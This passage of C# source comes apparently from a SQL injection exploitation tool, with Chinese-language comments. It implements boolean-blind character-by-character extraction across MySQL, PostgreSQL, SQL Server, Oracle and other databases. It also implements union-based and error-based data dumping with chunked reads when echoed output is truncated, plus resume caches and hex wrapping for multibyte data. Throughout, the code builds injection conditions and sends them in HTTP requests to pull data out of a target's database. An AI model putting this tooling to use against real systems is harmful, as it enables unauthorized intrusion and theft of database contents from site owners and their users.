        {
            var sb = new StringBuilder(n);
            for (int i = 1; i <= n; i++)
            {
                string payload = PayloadFactory.BPTool.BoolDataValue(dataPayload, i);
                int code = await GetBoolValueAsciiFreq(config, payload, sb.Length > 0 ? sb.ToString (): null).ConfigureAwait(false);
                if (code <= 0 || code > 127)
                {
                    return null;
                }
                sb.Append((char)code);
            }
            return sb.ToString();
        }

        /// <summary>
        /// 版本/Banner前缀延伸读取（常见值前缀延伸机制）：
        /// 字典前缀条目（"8.0."/"PostgreSQL 13."）逐段子串等值确认延伸已知前缀，无法延伸时按字典下一字符分组探测，
        /// 读到全长即收工；超出请求预算（约len/2+10次）放弃回退逐字符。学习到的完整版本值（检测泄漏指纹）优先整值等值
        /// </summary>
        /// <summary>字符语义盲注路径的库（ord/码点/unicode/ascw：断点按原字符计；hex路径库断点是hex字符，不能种原前缀）</summary>
        private static bool IsCharSemanticBlindPath(DBType dbType)
        {
            return dbType is DBType.MySQL or DBType.PostgreSQL or DBType.OpenGauss or DBType.Kingbase
                or DBType.SQLite or DBType.H2 or DBType.SQLServer or DBType.Access or DBType.HSQLDB;
        }

        private static async Task<string?> BannerPrefixRead(AppConfig config, string dataPayload, string casted, int len, DBType dbType)
        {
            List<string> entries = CommonOutputPredictor.GetBannerEntries(dbType);
            if (entries.Count == 0)
            {
                return null;
            }
            int budget = len / 2 + 10;
            int spent = 0;
            //学习到的完整版本值优先整值一枪（检测期泄漏指纹场景）
            foreach (string v in entries.Where(e => e.Length == len))
            {
                if (spent++ > 3)
                {
                    break;
                }
                if (await PredictEqualCheck(config, casted, v).ConfigureAwait(false))
                {
                    return v;
                }
            }
            string known = "";
            while (known.Length < len && spent < budget)
            {
                config.CheckStop();
                //当前前缀命中的条目（不区分大小写过滤，等值探测用条目原文）
                List<string> match = entries.Where(e => e.StartsWith(known, StringComparison.OrdinalIgnoreCase)).ToList();
                if (match.Count == 0)
                {
                    break;   //字典无此前缀条目，回退逐字符
                }
                //最长公共前缀延伸（超过已知前缀才值得子串等值确认）
                string lcp = match[0];
                foreach (string m in match.Skip(1))
                {
                    int i = 0;
                    while (i < lcp.Length && i < m.Length && char.ToLowerInvariant(lcp[i]) == char.ToLowerInvariant(m[i]))
                    {
                        i++;
                    }
                    lcp = lcp.Substring(0, i);
                }
                if (lcp.Length > known.Length && lcp.Length <= len)
                {
                    spent++;
                    string cond = "(case when (" + TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", casted), ("start", 1), ("len", lcp.Length)) + ")='" + lcp.Replace("'", "''", StringComparison.Ordinal) + "' then 1 else 0 end)";
                    if (await ProbeBool(config, cond, 0).ConfigureAwait(false))
                    {
                        known = lcp;
                        continue;
                    }
                    //LCP延伸失败：剔除走该前缀的条目（它不可能命中）
                    entries = entries.Where(e => !e.StartsWith(lcp, StringComparison.OrdinalIgnoreCase)
                        || e.Length < lcp.Length).ToList();
                    if (entries.Count == 0)
                    {
                        break;
                    }
                    continue;
                }
                //无公共延伸：按下一字符分组探测（字典指导的逐字符，最多探6组）
                char? next = null;
                var groups = match.Where(m => m.Length > known.Length)
                    .GroupBy(m => char.ToLowerInvariant(m[known.Length])).ToList();
                foreach (var g in groups.Take(6))
                {
                    spent++;
                    int pos = known.Length + 1;
                    string cond = "(case when (" + TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", casted), ("start", pos), ("len", 1)) + ")='" + g.Key + "' then 1 else 0 end)";
                    if (await ProbeBool(config, cond, 0).ConfigureAwait(false))
                    {
                        next = match.First(m => char.ToLowerInvariant(m[known.Length]) == g.Key)[known.Length];
                        break;
                    }
                }
                if (next == null)
                {
                    break;   //下一字符不在字典任何条目，回退逐字符
                }
                known += next;
            }
            if (known.Length == len)
            {
                return known;
            }
            if (known.Length >= 2 && IsCharSemanticBlindPath(dbType))
            {
                //已验证前缀种入断点缓存：回退逐字符读取时从 len(known)+1 续读，不重复消费
                _blindProgress[ScopeKey(config, dataPayload ?? "")] = known;
                Log.SysLog("版本前缀预测：已确认前缀 \"" + known + "\"，剩余部分转逐字符续读");
            }
            return null;
        }

        /// <summary>
        /// 盲注方式获取字符串值，按 BlindReadMode 路由：
        /// 自动=读模板 BlindStrategy 声明（MySQL ord打包值/PG·金仓·openGauss·SQLite·H2码点/SQLServer unicode/Access·HSQLDB按字符/其余hex）；
        /// Ord=强制MySQL ord路径；Hex=强制hex编码路径（多字节安全兜底）
        /// </summary>
        private static async Task<string?> GetStringByBoolInner(AppConfig config, string dataPayload, int maxLen)
        {
            DBType dbType = config.DataConfig.SelectedDBType;
            string readMode = config.DataConfig.BlindReadMode ?? "自动";
            if (readMode == "Hex编码")
            {
                return await GetStringByBoolHex(config, dataPayload, maxLen).ConfigureAwait(false);
            }
            if (readMode == "Ord打包值")
            {
                if (dbType.Equals(DBType.MySQL))
                {
                    return await GetStringByBoolOrd(config, dataPayload, maxLen).ConfigureAwait(false);
                }
                Log.Warning("Ord打包值仅适用于MySQL系，当前库回退自动路由！");
            }
            //自动路由：按模板 BlindStrategy 声明选最快且多字节安全的方案
            switch (PayloadFactory.BasePayload?.BlindStrategy)
            {
                //MySQL系：ord字节打包值自适应（ASCII≈9次/字符，3字节中文≈27次，优于hex的10/30）
                case "ord":
                    return await GetStringByBoolOrd(config, dataPayload, maxLen).ConfigureAwait(false);
                //SQLServer：unicode按字符读UTF-16码元
                case "unicode":
                    return await GetStringByBoolUnicode(config, dataPayload, maxLen).ConfigureAwait(false);
                //Access/HSQLDB等无hex函数的数据库：退化为按字符读取码值（ascii返回UTF-16码单元，支持中文）
                case "unicodechar":
                    return await GetStringByBoolUnicodeChar(config, dataPayload, maxLen).ConfigureAwait(false);
                //PG/openGauss/金仓 ascii与SQLite unicode返回真码点，H2 ascii返回UTF-16码元：码点自适应（ASCII≈9，中文≈17，远优于hex的10/30）
                case "codepoint":
                    return await GetStringByBoolCodepoint(config, dataPayload, maxLen).ConfigureAwait(false);
                default:
                    return await GetStringByBoolHex(config, dataPayload, maxLen).ConfigureAwait(false);
            }
        }

        /// <summary>
        /// 盲注逐字符读取统一骨架：长度探测→断点续取→ASCII整串预检→并行逐字符→进度提交。
        /// progressKey=断点缓存键；dataExpr=长度探测用数据表达式（ord路径为cast后表达式）；
        /// asciiPrecheck=整串纯ASCII预检（null=不预检）；readCharAt=逐字符读取策略（index/chars/asciiOnly）
        /// </summary>
        private static async Task<string> ReadBlindChars(AppConfig config, string progressKey, string dataExpr, int maxLen,
            Func<Task<bool>>? asciiPrecheck, Func<int, char[], bool, Task> readCharAt)
        {
            string lenPayload = PayloadFactory.BPTool.DataLen(dataExpr);
            int len = await GetLengthAdaptive(config, lenPayload, maxLen).ConfigureAwait(false);
            if (len <= 0)
            {
                return "";
            }
            char[] chars = new char[len];
            int startIdx = ResumePrefix(config, progressKey, chars);
            //整串ASCII-only预检：纯ASCII串逐字符直接1~127二分（7次/字符，免逐字符>255探测）
            bool asciiOnly = asciiPrecheck != null && await asciiPrecheck().ConfigureAwait(false);
            try
            {
                await WorkRunner.RunAsync(startIdx, len, config, async i => await readCharAt(i, chars, asciiOnly).ConfigureAwait(false));
            }
            catch
            {
                //中断（手动停止/网络异常）：保存断点，下次同payload从断点续取
                CommitProgress(config, progressKey, chars, false);
                throw;
            }
            CommitProgress(config, progressKey, chars, true);
            return new string(chars);
        }

        /// <summary>
        /// 逐字符码值读取统一策略：ASCII快车道（n-gram加权1~127二分≈7次/字符）/
        /// 自适应高低位（先1次探测码值>255，ASCII走1~255二分≈9次，多字节走256~65535≈17次）；
        /// gbkDecode=true时>255码值按unicode十六进制还原（SQLServer中文兼容旧行为）
        /// </summary>
        private static async Task ReadAdaptiveCodepoint(AppConfig config, string payload, char[] chars, int index, bool asciiOnly, bool gbkDecode)
        {
            int code = await ReadCodepointValidated(config, payload, async  ()=>
            {
                if (asciiOnly)
                {
                    //整串已确认纯ASCII：直接1~127二分（7次/字符），n-gram模型按已读前缀加权提速
                    return await GetBoolValueAsciiFreq(config, payload, AsciiPrefix(chars, index)).ConfigureAwait(false);
                }
                bool hi = await ProbeBool(config, payload, 255).ConfigureAwait(false);
                return hi
                    ? await GetBoolValue(config, payload, 256, 65535).ConfigureAwait(false)
                    : await GetBoolValue(config, payload, 1, 255).ConfigureAwait(false);
            }).ConfigureAwait(false);
            if (gbkDecode && code > 255)
            {
                string str = TextCodec.unHexByUnicode(code, "UTF-8");
                chars[index] = str.Length > 0 ? str[0] : '?';
                return;
            }
            chars[index] = code <= 0xFFFF ? (char)code : '?';
        }

        /// <summary>
        /// 码点方式盲注获取字符串（PG/openGauss/金仓/SQLite/H2）：Ascii模板即码点函数（ascii/unicode），
        /// 自适应高低位探测（ASCII走1~255二分≈9次/字符，多字节走256~65535≈17次），码点直接转字符
        /// </summary>
        public static async Task<string> GetStringByBoolCodepoint(AppConfig config, string dataPayload, int maxLen)
        {
            return await ReadBlindChars(config, dataPayload, dataPayload, maxLen,
                async  ()=> await HasMultibytePrecheck(config, dataPayload, config.DataConfig.SelectedDBType).ConfigureAwait(false) == false,
                async (i, chars, asciiOnly) =>
                {
                    //BoolDataValue = substr + Ascii模板（PG/金仓/openGauss=ascii码点，SQLite=unicode码点，H2=ascii UTF-16码元）
                    string payload = PayloadFactory.BPTool.BoolDataValue(dataPayload, i + 1);
                    await ReadAdaptiveCodepoint(config, payload, chars, i, asciiOnly, false).ConfigureAwait(false);
                }).ConfigureAwait(false);
        }

        /// <summary>
        /// ord方式盲注获取字符串（MySQL系）：ord(convert(substr using ucs2)) 返回UTF-16码元，
        /// 自适应高低位探测（ASCII≈9次/字符，中文≈17次，优于hex的10/30）；
        /// 服务端转码不绑连接字符集，4字节字符自动拆代理对；字符集配置时按码点集合二分
        /// </summary>
        public static async Task<string> GetStringByBoolOrd(AppConfig config, string dataPayload, int maxLen)
        {
            //cast成字符确保数值列按字符语义（ord(1)与ord('1')不同）
            string castedPayload = string.IsNullOrEmpty(PayloadFactory.BasePayload.Cast)
                ? dataPayload
                : TemplateRenderer.Render(PayloadFactory.BasePayload.Cast, ("expr", dataPayload));
            //MySQL Length模板=char_length，取字符数（ord按字符打包，与hex的字节数语义不同）；断点键用原始payload与hex路径隔离
            return await ReadBlindChars(config, dataPayload, castedPayload, maxLen,
                async  ()=> await HasMultibytePrecheck(config, castedPayload, config.DataConfig.SelectedDBType).ConfigureAwait(false) == false,
                async (i, chars, asciiOnly) =>
                {
                    //ord(convert(substr(data,i,1) using ucs2))：先转UCS-2再ord，返回UTF-16码元（中=0x4E2D），
                    //与SQLServer unicode同语义：中文16bit二分≈17次/字符（原生ord打包值24bit≈27次、hex≈30次）；
                    //服务端负责转码不绑连接字符集，4字节字符自动拆为代理对逐码元读取
                    string sub = TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", castedPayload), ("start", i + 1), ("len", 1));
                    string payload = "ord(convert(" + sub + " using ucs2))";
                    await ReadAdaptiveCodepoint(config, payload, chars, i, asciiOnly, false).ConfigureAwait(false);
                }).ConfigureAwait(false);
        }


        /// <summary>
        /// hex方式盲注获取字符串（hex结果全部为ASCII字符，客户端按数据库编码解码，支持中文等多字节数据）
        /// </summary>
        public static async Task<string> GetStringByBoolHex(AppConfig config, string dataPayload, int maxLen)
        {
            //数值列直接hex得到的是数值的十六进制（hex(1)='1'），必须先cast成字符再hex（hex(cast(1 as char))='31'），
            //否则奇数长度hex解码出错误字节（对标业界同类工具所有取值表达式统一CAST为字符）
            string castedPayload = string.IsNullOrEmpty(PayloadFactory.BasePayload.Cast)
                ? dataPayload
                : TemplateRenderer.Render(PayloadFactory.BasePayload.Cast, ("expr", dataPayload));
            //ASCII快车道（Oracle/DM/DB2/ClickHouse）：预检整串纯ASCII则走ascii逐字符读取（7次/字符，优于hex约9.2次/字节）；
            //用户强制Hex编码模式时不进车道（强制模式是ascii语义异常目标的兜底）
            bool? laneAscii = string.Equals(config.DataConfig.BlindReadMode, "Hex编码", StringComparison.Ordinal)
                ? null
                : await AsciiLanePrecheck(config, castedPayload, config.DataConfig.SelectedDBType).ConfigureAwait(false);
            if (laneAscii == true)
            {
                return await GetStringByBoolAsciiLane(config, castedPayload, maxLen).ConfigureAwait(false);
            }
            string hexPayload = TemplateRenderer.Render(PayloadFactory.BasePayload.Hex, ("expr", castedPayload));
            string lenPayload = PayloadFactory.BPTool.DataLen(hexPayload);
            int len = await GetLengthAdaptive(config, lenPayload, maxLen * 2 + 2).ConfigureAwait(false);
            if (len <= 0)
            {
                return "";
            }
            //MySQL conv字节直读：conv(substr(hex,2i+1,2),16,10)一步把hex对转回字节值0~255，
            //按字节频率IN二分（ASCII≈5次/字节），优于逐hex字符读取（≈7次/字节）
            if (config.DataConfig.SelectedDBType == DBType.MySQL && len % 2 == 0)
            {
                return await GetStringByBoolHexBytes(config, dataPayload, hexPayload, len / 2).ConfigureAwait(false);
            }
            //hex输出大小写确定的库用16字符集（恰好4次/hex字符），不确定保持24集兜底
            List<int> hexCodes = HexCharCodesFor(config.DataConfig.SelectedDBType);
            char[] chars = new char[len];
            int startIdx = ResumePrefix(config, dataPayload, chars);
            try
            {
                await WorkRunner.RunAsync(startIdx, len, config, async i => await GetAsciiCharByBool(config, hexPayload, chars, i, hexCodes));
            }
            catch
            {
                //中断（手动停止/网络异常）：保存断点，下次同payload从断点续取
                CommitProgress(config, dataPayload, chars, false);
                throw;
            }
            CommitProgress(config, dataPayload, chars, true);
            string hex = new string(chars);
            //SQLServer的fn_varbintohexstr带0x前缀
            if (hex.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
            {
                hex = hex.Substring(2);
            }
            try
            {
                return TextCodec.unHex(hex, config.DataConfig.DbEncoding);
            }
            catch (Exception e)
            {
                //oracle误判（目标无延时函数/网络抖动/条件恒真恒假）时hex串可能含废字符或奇数长度，
                //降级为返回原始hex并提示，避免整个取数流程崩溃
                Log.Warning("hex解码失败（盲注oracle可能误判），原始hex=" + hex + "，错误=" + e.Message);
                return hex;
            }
        }

        /// <summary>
        /// MySQL conv字节直读：conv(substr(hex,2i+1,2),16,10) 把hex对一步转回字节值0~255，
        /// 频率IN二分逐字节读取，字节序列按DbEncoding解码还原（支持中文等多字节）
        /// </summary>
        private static async Task<string> GetStringByBoolHexBytes(AppConfig config, string dataPayload, string hexPayload, int byteLen)
        {
            char[] buf = new char[byteLen];
            //断点键加|conv后缀，与逐hex字符路径的进度缓存隔离（内容形态不同）
            string progressKey = dataPayload + "|conv";
            int startIdx = ResumePrefix(config, progressKey, buf);
            try
            {
                await WorkRunner.RunAsync(startIdx, byteLen, config, async i =>
                {
                    string byteExpr = "conv(substr(" + hexPayload + "," + (2 * i + 1) + ",2),16,10)";
                    int b = await GetBoolValueByteFreq(config, byteExpr, AsciiPrefix(buf, i)).ConfigureAwait(false);
                    buf[i] = (char)b;
                });
            }
            catch
            {
                CommitProgress(config, progressKey, buf, false);
                throw;
            }
            CommitProgress(config, progressKey, buf, true);
            byte[] bytes = buf.Select(c => (byte)c).ToArray();
            Encoding enc;
            try { enc = Encoding.GetEncoding(config.DataConfig.DbEncoding); }
            catch { enc = Encoding.UTF8; }
            return enc.GetString(bytes);
        }

        /// <summary>字节值0~255频率二分：ASCII段用字符频率表，128~255（UTF-8多字节段）给平坦中低权重；prefix融入n-gram模型概率</summary>
        private static async Task<int> GetBoolValueByteFreq(AppConfig config, string byteExpr, string? prefix = null)
        {
            return await ReadCodepointValidated(config, byteExpr,
                 ()=> GetBoolValueFreq(config, byteExpr, ByteRangeCache, prefix)).ConfigureAwait(false);
        }
        private static readonly List<int> ByteRangeCache = Enumerable.Range(0, 256).ToList();

        /// <summary>
        /// hex输出恒定候选集：0-9a-fA-F + SQLServer fn_varbintohexstr 0x前缀的x/X（共24个）。
        /// hex盲注读的是hex数字符而非内容字符，候选集固定，频率IN二分≈3.5次/字符（原均匀二分4次）
        /// </summary>
        private static readonly List<int> HexCharCodes = "0123456789abcdefABCDEFxX".Select(c => (int)c).OrderBy(x => x).ToList();
        private static readonly List<int> HexCharCodesUpper = "0123456789ABCDEF".Select(c => (int)c).OrderBy(x => x).ToList();
        private static readonly List<int> HexCharCodesLower = "0123456789abcdef".Select(c => (int)c).OrderBy(x => x).ToList();

        /// <summary>
        /// 按库选hex字符集：hex输出大小写确定的库用16集（恰好4次/hex字符，较24集省~13%），不确定的库保持24集兜底
        /// </summary>
        private static List<int> HexCharCodesFor(DBType dbType)
        {
            return dbType switch
            {
                //rawtohex/hex大写输出：MySQL/Oracle/DB2/DM/SQLite/H2/ClickHouse
                //（MySQL hex实测大写'E59388'——曾误判小写集导致hex盲注把'E'读成'9'，中文取回6个U+FFFD乱码）
                DBType.MySQL or DBType.Oracle or DBType.DB2 or DBType.DM or DBType.SQLite or DBType.H2 or DBType.ClickHouse => HexCharCodesUpper,
                //encode(x,'hex')小写输出：PG/金仓/openGauss
                DBType.PostgreSQL or DBType.Kingbase or DBType.OpenGauss => HexCharCodesLower,
                //SQLServer（fn_varbintohexstr带0x前缀需x）/Informix等不确定场景保持24集兜底
                _ => HexCharCodes
            };
        }

        private static async Task GetAsciiCharByBool(AppConfig config, string dataPayload, char[] chars, int index, List<int> hexCodes)
        {
            string payload = PayloadFactory.BPTool.BoolDataValue(dataPayload, index + 1);
            int data = await ReadCodepointValidated(config, payload,
                 ()=> GetBoolValueInSet(config, payload, hexCodes)).ConfigureAwait(false);
            chars[index] = (char)data;
        }

        /// <summary>
        /// ascii快车道：整串经AsciiLanePrecheck确认纯ASCII（每字符≤127），逐字符1~127二分（7次/字符）；
        /// 仅Oracle/DM/DB2/ClickHouse等hex路径库在纯ASCII内容时进入（库表列名/hash/版本号等取数大头场景）
        /// </summary>
        private static async Task<string> GetStringByBoolAsciiLane(AppConfig config, string castedPayload, int maxLen)
        {
            //断点续传以castedPayload为键（与hex路径的dataPayload键隔离，互不污染）
            return await ReadBlindChars(config, castedPayload, castedPayload, maxLen, null,
                async (i, chars, _) =>
                {
                    string payload = PayloadFactory.BPTool.BoolDataValue(castedPayload, i + 1);
                    await ReadAdaptiveCodepoint(config, payload, chars, i, true, false).ConfigureAwait(false);
                }).ConfigureAwait(false);
        }

        /// <summary>
        /// unicode方式盲注按字符获取（用于SQLServer，大于255的字符按GB2312解码）
        /// </summary>
        public static async Task<string> GetStringByBoolUnicode(AppConfig config, string dataPayload, int maxLen)
        {
            return await ReadBlindChars(config, dataPayload, dataPayload, maxLen,
                //SQLServer整串ASCII预检（二进制collation+LIKE '%[^ -~]%'）：纯ASCII逐字符1~127二分（7次/字符，免>255探测）
                async  ()=> !await SqlServerHasNonAsciiPrecheck(config, dataPayload).ConfigureAwait(false),
                async (i, chars, asciiOnly) =>
                {
                    string payload = PayloadFactory.BasePayload.Get("NocastUnicodeValue").Replace("{data}", dataPayload, StringComparison.Ordinal).Replace("{index}", (i + 1) + "", StringComparison.Ordinal);
                    await ReadAdaptiveCodepoint(config, payload, chars, i, asciiOnly, true).ConfigureAwait(false);
                }).ConfigureAwait(false);
        }

        /// <summary>
        /// ascw方式盲注按字符获取（用于Access/HSQLDB，ascw/ascii直接返回UTF-16码值）
        /// </summary>
        public static async Task<string> GetStringByBoolUnicodeChar(AppConfig config, string dataPayload, int maxLen)
        {
            return await ReadBlindChars(config, dataPayload, dataPayload, maxLen, null,
                async (i, chars, _) =>
                {
                    string payload = PayloadFactory.BPTool.BoolDataValue(dataPayload, i + 1);
                    await ReadAdaptiveCodepoint(config, payload, chars, i, false, false).ConfigureAwait(false);
                }).ConfigureAwait(false);
        }

        /// <summary>Union单发取数（UnionAll包装一次请求），返回解析结果与原始响应（截断判定用）</summary>
        private static async Task<(string data, HttpResponse response, string payloadData)> UnionDumpSingleRaw(AppConfig config, string payload)
        {
            int sumCount = (int)config.DataConfig.SumColumnCount;
            int showIndex = (int)config.DataConfig.ShowColumnIndex;
            string payloadData = PayloadFactory.BPTool.UnionAll(payload, sumCount, showIndex);
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.Payload = payloadData;
            HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            return (ParseUnionOrErrorData(response, payloadData), response, payloadData);
        }

        public static async Task<string> DataDumpWithNoFrom(AppConfig config, string payload)
        {
            //G4跨通道值缓存：Union通道取结构类单值前查缓存（键=原始payload哈希，与盲注通道共享同一键空间）
            string? cached = ValueCacheGet(config, payload);
            if (cached != null)
            {
                if (!config.DataConfig.ValueCacheVerify || await ValueCacheVerifyHit(config, payload, cached).ConfigureAwait(false))
                {
                    Log.SysLog("值缓存命中（Union通道复用）：" + cached);
                    return cached;
                }
                Log.Warning("值缓存已过期（目标值变化）：旧值=" + cached + "，剔除并重读");
                ValueCacheRemove(config, payload);
            }
            string originalPayload = payload;
            //中文识别（--hex）：取值表达式HEX(CAST)包装，回显纯ASCII，取回后按DbEncoding解码
            bool hex = HexActive(config);
            if (hex)
            {
                payload = HexWrapIfNeeded(config, payload);
            }
            var (data, response, payloadData) = await UnionDumpSingleRaw(config, payload).ConfigureAwait(false);
            if (string.IsNullOrEmpty(data) && IsTruncatedMarker(response, payloadData))
            {
                //单发为空且起始标记在/结束标记丢失 → Union回显被截断（union截断信号），转substr分片取回
                data = await UnionDumpChunked(config, payload).ConfigureAwait(false);
            }
            data = hex ? HexUnwrapIfNeeded(config, data) : data;
            ValueCachePut(config, originalPayload, data);
            return data;
        }

        /// <summary>
        /// Union通道分片取数：先取总长度（数值短不会被截），再按substr分片取回拼接。
        /// 步长256起步，片空且仍截断则折半（下限16，到底放弃并抢救已得数据）；片长小于步长即收尾。
        /// 大结果集窗口化取数思路，应对max_allowed_packet/页面缓冲等Union回显截断场景
        /// </summary>
        private static async Task<string> UnionDumpChunked(AppConfig config, string payload)
        {
            string lenExpr = TemplateRenderer.Render(PayloadFactory.BasePayload.Length, ("expr", payload));
            var (lenStr, _, _) = await UnionDumpSingleRaw(config, lenExpr).ConfigureAwait(false);
            if (!int.TryParse(lenStr, out int total) || total <= 0)
            {
                return "";
            }
            total = Math.Min(total, 65535);
            Log.Show("Union回显截断，转分片取数：总长 " + total + " 字符");
            int step = 256;
            StringBuilder sb = new StringBuilder(total);
            int s = 1;
            while (s <= total)
            {
                config.CheckStop();
                string sliceExpr = TemplateRenderer.Render(PayloadFactory.BasePayload.Substr, ("expr", payload), ("start", s), ("len", step));
                var (slice, resp, slicePayload) = await UnionDumpSingleRaw(config, sliceExpr).ConfigureAwait(false);
                if (string.IsNullOrEmpty(slice))
                {
                    if (IsTruncatedMarker(resp, slicePayload) && step > 16)
                    {
                        //单片仍被截断：折半步长重试同一片
                        step /= 2;
                        Log.SysLog("Union分片步长折半为 " + step + "（单片仍截断）");
                        continue;
                    }
                    //兜底抢救本片的截断部分
                    slice = ParseTrimmed(resp, slicePayload);
                    if (string.IsNullOrEmpty(slice))
                    {
                        break;
                    }
                }
                sb.Append(slice);
                s += slice.Length;
                if (slice.Length < step)
                {
                    //短片=已到数据末尾
                    break;
                }
            }
            return sb.ToString();
        }

        public static async Task<string> DataDump(AppConfig config, string payload)
        {
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.Payload = payload;
            HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            string data = ParseUnionOrErrorData(response, payload);
            //行数据payload是整段SQL无法通用分片，截断时兜底抢救部分数据（截断兜底）
            if (string.IsNullOrEmpty(data) && IsTruncatedMarker(response, payload))
            {
                data = ParseTrimmed(response, payload);
            }
            return data;
        }

        /// <summary>
        /// Union批量取数多块解析（Q3）：聚合函数把多行拼成单行回显，每行自带起始/结束标记，
        /// 按标记顺序切出全部数据块（一块=一行），0块且命中截断特征时兜底抢救一块
        /// </summary>
        public static async Task<List<string>> DataDumpRows(AppConfig config, string payload)
        {
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.Payload = payload;
            HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            List<string> list = ParseAllMarkerChunks(response, payload);
            if (list.Count == 0 && IsTruncatedMarker(response, payload))
            {
                string trimmed = ParseTrimmed(response, payload);
                if (!string.IsNullOrEmpty(trimmed))
                {
                    list.Add(trimmed);
                }
            }
            return list;
        }

        /// <summary>按起始/结束标记切出响应中全部数据块（顺序保持），payload非空时先剔除回显的注入原文防脏数据</summary>
        public static List<string> ParseAllMarkerChunks(HttpResponse response, string? payload)
        {
            List<string> list = new List<string>();
            try
            {
                string body = response.BodyTxt ?? "";
                if (body.Length == 0)
                {
                    return list;
                }
                if (!string.IsNullOrEmpty(payload))
                {
                    body = InjectTools.StripPayloadReflection(body, payload);
                }
                MatchCollection ms = GetCachedRegex("(?<=(" + EchoMarkers.Start + EchoMarkers.Split + "))[.\\s\\S]*?(?=(" + EchoMarkers.Split + EchoMarkers.End + "))").Matches(body);
                foreach (Match m in ms)
                {
                    list.Add(m.Value);
                }
            }
            catch (Exception e)
            {
                Log.SysLog("ParseAllMarkerChunks:" + e.Message);
            }
            return list;
        }


        public static async Task<string> DataDumpWithError(AppConfig config, string payload)
        {
            //SQLite的cast(... as int)失败不抛错，报错取数原理性不可行
            if (config.DataConfig.SelectedDBType == DBType.SQLite)
            {
                Log.Warning("SQLite不支持报错取数（cast失败不抛错），请改用盲注或Union通道！");
                return "";
            }
            //G4跨通道值缓存：Error通道取结构类单值前查缓存（与盲注/Union共享同一payload键空间）
            string? cached = ValueCacheGet(config, payload);
            if (cached != null)
            {
                if (!config.DataConfig.ValueCacheVerify || await ValueCacheVerifyHit(config, payload, cached).ConfigureAwait(false))
                {
                    Log.SysLog("值缓存命中（Error通道复用）：" + cached);
                    return cached;
                }
                Log.Warning("值缓存已过期（目标值变化）：旧值=" + cached + "，剔除并重读");
                ValueCacheRemove(config, payload);
            }
            string originalPayload = payload;
            //中文识别（--hex）：取值表达式HEX(CAST)包装，回显纯ASCII，取回后按DbEncoding解码
            //（长度/分片内部调用走ErrorDumpSingle/ErrorDumpChunked直接持有包装后表达式，不会二次包装）
            bool hex = HexActive(config);
            if (hex)
            {
                payload = HexWrapIfNeeded(config, payload);
            }
            string data = await ErrorDumpSingle(config, payload).ConfigureAwait(false);
            if (string.IsNullOrEmpty(data))
            {
                //单发为空：可能是报错回显长度受限被截断（如MySQL updatexml约32字符含标记），尝试分片取回拼接
                data = await ErrorDumpChunked(config, payload).ConfigureAwait(false);
            }
            data = hex ? HexUnwrapIfNeeded(config, data) : data;
            ValueCachePut(config, originalPayload, data);
            return data;
        }

        /// <summary>
        /// 报错通道单发取数（ErrorData整体包装一次请求）。
        /// where=3参数替换vector模式：报错触发函数由vector模板自带（如EXP(~(SELECT * FROM (SELECT CONCAT(...)))x)），
        /// payload只需做ConcatData标记包装后进[QUERY]槽位，不再套ErrorData触发模板（否则双重触发函数嵌套报错）
        /// </summary>
        private static async Task<string> ErrorDumpSingle(AppConfig config, string payload)
        {
            string payloadData = config.DataConfig.IsVectorMode
                ? PayloadFactory.BPTool.ConcatData(new List<string> { payload })
                : PayloadFactory.BPTool.ErrorData(payload);
            HttpRequest request = HttpRequest.CreateForSend(config, config.RequestTxt); //T1轻量发送构造：跳过参数/JSON/XML解析
            request.Payload = payloadData;
            HttpResponse response = await HTTPTool.SendRequestRetryAsync(request).ConfigureAwait(false);
            return ParseUnionOrErrorData(response, payloadData);
        }

        /// <summary>报错分片有效步长（供行数据/读文件等手工分片循环用）：实测容量 → 探针探测 → 模板ErrorChunkLen → 默认58</summary>
        public static async Task<int> GetErrorChunkStep(AppConfig config)
        {
            int step = config.DataConfig.MeasuredErrorChunkLen;
            if (step <= 0)
            {
                step = await ProbeErrorChunkLen(config).ConfigureAwait(false);
            }
            if (step <= 0)
            {
                step = PayloadFactory.BasePayload.ErrorChunkLen;
            }
            return step > 0 ? step : 58;
        }

        //---------------- 中文识别（hex 能力）：Union/报错通道取值表达式HEX包装，客户端解码 ----------------

        /// <summary>cast包装（NoCast开启或模板无cast时原样返回）：整值等值探测/hex包装内层共用，避免特殊环境类型转换失败</summary>
        public static string CastWrapIfNeeded(AppConfig config, string payload)
        {
            if (config.DataDump.DumpNoCast || string.IsNullOrEmpty(PayloadFactory.BasePayload.Cast))
            {
                return payload;
            }
            return TemplateRenderer.Render(PayloadFactory.BasePayload.Cast, ("expr", payload));
        }

        /// <summary>中文识别开启且当前库有hex函数时，取值表达式统一 HEX(CAST(x)) 包装（回显纯ASCII，多字节数据不乱码；NoCast时跳过内层cast）</summary>
        public static string HexWrapIfNeeded(AppConfig config, string payload)
        {
            if (!config.DataConfig.HexDecode || string.IsNullOrEmpty(PayloadFactory.BasePayload.Hex))
            {
                return payload;
            }
            return TemplateRenderer.Render(PayloadFactory.BasePayload.Hex, ("expr", CastWrapIfNeeded(config, payload)));
        }

        /// <summary>中文识别开启时，把取回的hex串按DbEncoding解码还原（截断/误判导致解码失败时降级返回原文并告警）</summary>
        public static string HexUnwrapIfNeeded(AppConfig config, string data)
        {
            if (!config.DataConfig.HexDecode || string.IsNullOrEmpty(data))
            {
                return data;
            }
            string hex = data;
            //SQLServer的fn_varbintohexstr带0x前缀
            if (hex.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
            {
                hex = hex.Substring(2);
            }
            try
            {
                return TextCodec.unHex(hex, config.DataConfig.DbEncoding);
            }
            catch (Exception e)
            {
                Log.Warning("hex解码失败（可能截断/误判），返回原始hex，错误=" + e.Message);
                return data;
            }
        }

        /// <summary>当前中文识别是否实际生效（开关开启且模板有hex函数）</summary>
        public static bool HexActive(AppConfig config)
        {
